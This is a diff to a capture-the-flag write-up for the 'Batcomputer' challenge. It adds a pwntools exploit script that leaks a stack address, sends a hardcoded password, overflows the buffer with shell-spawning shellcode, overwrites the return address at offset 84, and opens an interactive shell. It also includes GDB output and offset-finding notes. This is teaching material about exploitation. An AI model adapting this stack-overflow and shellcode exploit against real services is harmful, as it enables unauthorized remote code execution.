@@ -1,13 +1,5 @@
 ### Batcomputer
 
-```python
->>> import pwn
->>> pwn.cyclic(137)
-b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabj'
->>> pwn.cyclic_find('vaaa')
-84
-```
-
 GDB output :
 ```bash
 gdb-peda$ r                                                                                                                                                                                          
@@ -49,5 +41,49 @@ EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow
 
 ```
 
-
 Here the RIP would be overwritten by the first 4 characters shown to us in the RSP which in our case is "vaaa"
+
+This is command prompt i used to create the cyclic variables and check what is the offset
+
+```python
+>>> import pwn
+>>> pwn.cyclic(137)
+b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabj'
+>>> pwn.cyclic_find('vaaa')
+84
+```
+
+Solution :
+```python
+from pwn import *
+
+def main():
+    context(os='linux', arch='amd64')
+    io = remote('remote ip', remote port) # Connecting to a Remote IP and Port
+    # First Step is to ennumerate
+    password = 'b4tp@$$w0rd!' # Password we got from Ghidra
+    return_address = 84 # GDB gave us the offset / the amount of bytes to overwrite the EIP
+
+    # get stack address
+
+    io.sendlineafter('> ', '1') # As the prompt starts like "> "  and asks for our input
+    stack_address = io.recvline().strip().split()[-1]  # Get the last item of the output here which is ----------------- address
+    stack_address = ''.join([chr(int(stack_address[i:i+2], 16)) for i in range(2, len(stack_address), 2)]) # To make the address  we get from this into bytes 0x12345678 to /x12/x34/x56/x78 etc.
+    # To make sure the address is 8 bytes
+    stack_address = stack_address.rjust(8, '\x00')
+    stack_address = u64(stack_address, endian='big') # To make it easier to work with it with addition to the address and so on and we set it to little endian as we have LSB so Least Significant Bits first so big endian
+    log.success(f'Gottem: {p64(stack_address)}' ) # Just logging to see if all is alright
+
+    # Step 2 : Do Buffer Overflow
+    io.sendlineafter('> ', '2')
+    io.sendlineafter('password: ', password)
+    shellcode = asm(shellcraft.popad() + shellcraft.sh())
+    padding = b'a'* (return_address - len(shellcode))
+    payload = shellcode + padding + p64(stack_address)   
+    io.sendlineafter('commands: ', payload)
+    # To Triger the fault we need to return so doing 3 we get the seg fault error
+    io.sendlineafter('> ', '3')
+    io.interactive()
+
+main()
+```
